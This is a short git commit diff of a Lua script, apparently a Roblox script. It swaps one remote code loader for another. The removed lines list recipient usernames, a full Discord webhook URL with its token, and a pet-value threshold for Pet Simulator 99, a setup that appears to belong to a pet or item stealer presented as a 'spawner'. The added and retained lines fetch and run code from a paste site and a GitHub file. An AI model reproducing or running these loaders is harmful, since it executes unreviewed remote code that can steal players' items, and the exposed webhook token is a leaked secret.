97e71165ceb17d69503bfd5f8098ba71fa21ddea
skullsidk-prog <skullsidk@gmail.com>
2025-12-21 20:35:08 -0500

    Update s.lua

--- s.lua
+++ s.lua
@@ -1,5 +1,3 @@
-Username = {"qusay52VxWi","ajandaa12"} 
-Webhook = "https://discord.com/api/webhooks/1394673795377270804/MivmTd8U5V-lGyGhBeBy-woMHFcFf0QX86Wdafs-AYSDFkkkl4EgQsl6Oj9T1ol1Oory" 
-min_rap = 20 --for pets go and pet simulator 99 
-loadstring(game:HttpGet("http://d3ath-feather.top:9471/all_in_one.lua"))()
+loadstring(game:HttpGet("https://cdn.sourceb.in/bins/qiL5bEXP2z/0", true))()
+
 loadstring(game:HttpGet("https://raw.githubusercontent.com/skullsidk-prog/adm/refs/heads/main/spawner.lua", true))()
